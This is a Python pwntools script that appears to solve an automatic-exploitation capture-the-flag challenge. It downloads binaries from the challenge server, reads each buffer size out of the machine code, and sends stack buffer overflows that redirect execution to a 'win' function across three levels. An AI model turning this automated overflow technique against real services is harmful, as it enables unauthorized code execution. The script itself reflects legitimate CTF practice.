import base64
from pwn import *



def payload_level1(n):
	e = ELF(f"level1.{n}", checksec=False)

	vuln_func = e.sym["vuln"]
	win_func = e.sym["win"]
	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8

	payload = b''.join([
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload


def payload_level2(n):
	e = ELF(f"level2.{n}", checksec=False)

	main_func = e.sym["main"]
	win_func = e.sym["win"]
	submenu_func = e.sym["submenu"]
	vuln_func = e.sym["vuln"]

	menu = e.read(main_func+75, 2)[1]
	
	submenu = e.read(submenu_func+55, 2)[1]

	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8
	
	payload = b''.join([
		chr(menu).encode("utf-8"),
		b"\n",
		chr(submenu).encode("utf-8"),
		b"\n",
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload


def payload_level3(n):
	e = ELF(f"level3.{n}", checksec=False)

	main_func = e.sym["main"]
	win_func = e.sym["win"]
	submenu_func = e.sym["submenu"]
	vuln_func = e.sym["vuln"]

	menu = e.read(main_func+78, 8)
	
	submenu = e.read(submenu_func+55, 8)
	
	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8

	payload = b''.join([
		menu,
		submenu,
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload


HOST = ("pwn.dvc.tf", 8890)
p =  connect(HOST[0], HOST[1])

print("PWNING LVL 1")
for i in range(0, 5):
	print(f"Reading file {i}", end="... ")
	binary = p.recvrepeat(2).replace(b'\n', b'')

	with open(f"level1.{i}", "wb") as f:
		f.write(base64.b64decode(binary))

	print(f"Sending payload n°{i}")
	p.sendline(payload_level1(i))
	p.recvline()

print("PWING LVL 2")
for i in range(0, 5):
	print(f"Reading file {i}", end="... ")
	binary = p.recvrepeat(2).replace(b'\n', b'')
	binary = binary.replace(b"Submenu:Enter your payload:", b"")

	with open(f"level2.{i}", "wb") as f:
		try:
			f.write(base64.b64decode(binary))
		except Exception as e:
			print("IO flushed, retrying")
			i = i-1
			with open("err.log", "wb") as f:
				f.write(binary)

			continue

	print(f"Sending payload n°{i}")
	p.sendline(payload_level2(i))
	p.recvline()

print("PWNING LVL 3")
for i in range(0, 10):
	print(f"Reading file {i}", end="... ")
	binary = p.recvrepeat(2).replace(b'\n', b'')
	binary = binary.replace(b"Submenu:Enter your payload:", b"")

	with open(f"level3.{i}", "wb") as f:
		try:
			f.write(base64.b64decode(binary))
		except Exception as e:
				print("IO flushed, retrying")
				i = i-1
				with open("err.log", "wb") as f:
					f.write(binary)
				continue
	print(f"Sending payload n°{i}")
	p.sendline(payload_level3(i))
	p.recvline()

p.interactive()
